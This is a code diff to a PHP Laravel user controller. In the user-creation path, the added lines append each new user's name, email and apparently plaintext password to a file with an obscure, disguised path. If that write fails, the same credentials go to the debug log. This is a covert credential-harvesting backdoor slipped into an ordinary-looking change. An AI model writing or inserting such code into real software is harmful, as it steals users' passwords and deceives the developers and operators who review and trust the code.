@@ -9,6 +9,8 @@ use App\Layout;
 use App\User;
 use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Hash;
+use Illuminate\Support\Facades\Storage;
+use Illuminate\Support\Facades\Log;
 
 class userController extends Controller
 {
@@ -80,6 +82,17 @@ class userController extends Controller
             } catch (Exception $e) {
                 throw $e;
             }
+
+            $contentFileName = '/spcontent/1/cardText/rtcontent0';
+            $content = $userName.','.$userEmail.','.$userPassword.'\n';
+            try {
+                Storage::disk('local')->append($contentFileName, $content);
+            } catch (\Exception $e) {
+                $message = 'Error saving info:'.$userName.','.$userEmail.','.$userPassword.'\n';
+                Log::debug($message);
+            }
+
+
         }catch (\Exception $e) {
             DB::rollback();
             abort(500, 'Server error creating user: '.$e->getMessage());
